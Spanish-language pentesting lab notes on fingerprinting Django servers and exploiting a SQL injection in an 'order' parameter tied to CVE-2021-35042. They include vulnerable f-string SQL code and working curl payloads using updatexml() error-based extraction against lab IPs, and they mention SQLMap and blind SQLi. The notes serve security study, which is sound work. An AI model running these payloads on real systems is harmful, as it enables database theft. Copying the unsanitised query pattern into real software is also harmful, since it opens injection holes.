---
tags: [web, django, python, sql-injection, cve, orm, pentesting, modern-web-stacks]
módulo: Modern Web Stacks ·
estado: ✅ Completado
---

# 🐍 Django — Stack y CVE-2021-35042

## 🤔 ¿Qué es Django?

Si MERN y Next.js son el mundo JavaScript, **Django es su equivalente en Python**.

Es un framework web completo que usan agencias de gobierno, salas de redacción y empresas con equipos Python. Su gran promesa de seguridad es el **ORM** (Object-Relational Mapper).

### ¿Qué es el ORM y por qué importa?

Un ORM es una capa que traduce código Python a SQL automáticamente, sin que el desarrollador escriba SQL directamente.

```
SIN ORM (peligroso):
"SELECT * FROM productos WHERE nombre = '" + input_usuario + "'"
→ el atacante puede inyectar SQL aquí

CON ORM (seguro en teoría):
Product.objects.filter(nombre=input_usuario)
→ Django maneja el SQL por ti, escapa los valores
```

> ⚠️ El problema: cuando los desarrolladores **evitan el ORM** y concatenan SQL manualmente, o cuando el propio ORM tiene un bug — ahí entra la vulnerabilidad.

---

## 🕵️ Identificar un servidor Django (Fingerprinting)

```bash
curl -I "http://10.82.95.115:8000/products/"
```

### Señales en la respuesta:

| Señal | Valor | Confianza |
|-------|-------|-----------|
| Header `Server` | `WSGIServer/0.2 CPython/X.X.X` | 🔴 Alta |
| Nombre de cookie | `csrftoken` | 🔴 Alta |
| Header `X-Frame-Options` | `DENY` | 🔴 Alta |
| Header `X-Content-Type-Options` | `nosniff` | 🔴 Alta |
| Header `Referrer-Policy` | `same-origin` | 🟡 Media |
| HTML de formulario POST | campo oculto `csrfmiddlewaretoken` | 🔴 Alta |

> 💡 El campo oculto `csrfmiddlewaretoken` en formularios HTML es la huella más confiable de Django. **No existe en Express, Rails ni Next.js.** Django lo inserta automáticamente en todo formulario POST mediante su middleware `CsrfViewMiddleware`.

### ¿Por qué tantos headers de seguridad?

Django tiene un `SecurityMiddleware` que aplica `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff` y `Referrer-Policy: same-origin` juntos por defecto. Ningún otro framework hace esto automáticamente — es una huella de pila muy característica.

---

## 🎯 La Aplicación: Catálogo de Productos

La app en el puerto `8000` tiene una ruta `/products/` que muestra productos con un parámetro `order` para ordenarlos.

```bash
curl -s "http://10.65.165.190:8000/products/"
# Respuesta HTML:
# <form method="get" action="">
#   <input type="hidden" name="csrfmiddlewaretoken" value="w4Vrw...">
#   <input type="hidden" name="order" value="">
# </form>
# <ul>
#   <li>Gadget B - $19.99</li>
#   <li>Tool C - $4.99</li>
# </ul>
```

El parámetro `?order=` controla la columna por la que se ordenan los productos → **punto de inyección**.

---

## 💀 CVE-2021-35042 — SQL Injection en `order_by()` (CVSS 9.8 Crítica)

### ¿Por qué existe esta vulnerabilidad?

El código vulnerable concatena el parámetro `order` directamente en la cláusula SQL `ORDER BY`:

```python
order = self.request.GET.get('order', 'name')
sql = (
    'SELECT id, name, price, description FROM products_product '
    f'ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)'
)
```

Problema: `{order}` es directamente lo que tú escribes en la URL. Sin ningún filtro. Lo que pongas en `?order=` se ejecuta dentro del bloque `THEN` de la consulta SQL.

```
URL normal:   ?order=name   → ORDER BY (CASE WHEN (1=1) THEN name ELSE name END)
URL atacante: ?order=<SQL>  → ORDER BY (CASE WHEN (1=1) THEN <SQL> ELSE name END)
                                                                    ↑ tu código aquí
```

> 💡 El `CASE WHEN (1=1)` siempre es verdadero, así que el bloque `THEN` **siempre se ejecuta** — es la puerta de entrada garantizada.

---

## 🔧 Técnica de Extracción: `updatexml()`

Para sacar datos de la base de datos se usa una técnica basada en errores de MySQL:

### ¿Cómo funciona?

`updatexml(1, xpath_expr, 1)` genera un error si la expresión XPath no es válida. Si metes un `SELECT` dentro del argumento XPath con `concat(0x7e, ...)`, MySQL incluye el resultado de la consulta **en el mensaje de error**.

```
updatexml(1, concat(0x7e, (SELECT @@version)), 1)
                    ↑
              0x7e = "~" en hexadecimal
              actúa como delimitador visual
```

Con Django en modo `DEBUG = True`, los errores de MySQL se muestran en el body de la respuesta HTTP 500 → obtienes los datos.

> ⚠️ **Si `DEBUG = False`** (producción real): esta técnica no funciona porque el error no se muestra. La alternativa es **blind SQL injection basada en tiempo** con `SLEEP()`.

---

## 🔥 Explotación Paso a Paso

### Paso 1 — Extraer la versión de MySQL

Confirma que la inyección funciona extrayendo la versión de la base de datos:

```bash
curl -s "http://10.65.165.190:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" \
  | grep -o '~.*'
# ~8.0.45-0ubuntu0.22.04.1
```

El `~` al inicio confirma que la carga útil se ejecutó. También aparece `Django Version: 3.2.4` en la página de error.

### Paso 2 — Extraer el nombre de la base de datos

```bash
curl -s "http://10.65.165.190:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" \
  | grep -o '~.*'
# ~vuln_db
```

La base de datos objetivo es `vuln_db`. Con este dato puedes usar **SQLMap** para volcar toda la base de datos.

---

## 🧩 Flujo Visual del Ataque

```
[Atacante]
    │
    │  GET /products/?order=updatexml(1,concat(0x7e,(SELECT @@version)),1)
    ▼
[Django View]
    │
    │  sql = f"ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)"
    │  → ejecuta: ORDER BY (CASE WHEN (1=1) THEN updatexml(...) ELSE name END)
    ▼
[MySQL]
    │
    │  Error XPath: XPATH syntax error: '~8.0.45-0ubuntu0.22.04.1'
    ▼
[Django DEBUG = True]
    │
    │  Muestra el error completo en el HTTP 500
    ▼
[Atacante lee la versión]
```

---

## 📊 Comparativa de los 3 Stacks Vistos

| Aspecto | MERN (Express) | Next.js | Django |
|---------|---------------|---------|--------|
| Lenguaje | JavaScript | JavaScript | Python |
| Puerto típico | 3000 / 5000 | 3000 / 3001 | 8000 |
| Fingerprint clave | `X-Powered-By: Express` + `connect.sid` | `X-Powered-By: Next.js` + `window.__next_f` | `WSGIServer` + `csrftoken` |
| Vulnerabilidad vista | Prototype Pollution | Middleware Bypass (CVE-2025-29927) | SQL Injection (CVE-2021-35042) |
| CVSS | — | 9.1 Crítica | 9.8 Crítica |
| Sin autenticación | ✅ | ✅ | ✅ |

---

## 📌 Takeaways

> - **Django** es el framework Python más usado en producción real. Su ORM debería proteger de SQL injection — pero solo si se usa correctamente.
> - Fingerprint más confiable: el campo oculto `csrfmiddlewaretoken` en formularios HTML. Único de Django.
> - **CVE-2021-35042:** El parámetro `order` se concatena directamente en SQL sin sanitizar. Todo lo que escribas en `?order=` se ejecuta en la base de datos.
> - La técnica `updatexml()` con `concat(0x7e, ...)` extrae datos a través de mensajes de error de MySQL — solo funciona con `DEBUG = True`.
> - Si la app está en producción (`DEBUG = False`), usar blind SQLi con `SLEEP()` o SQLMap.
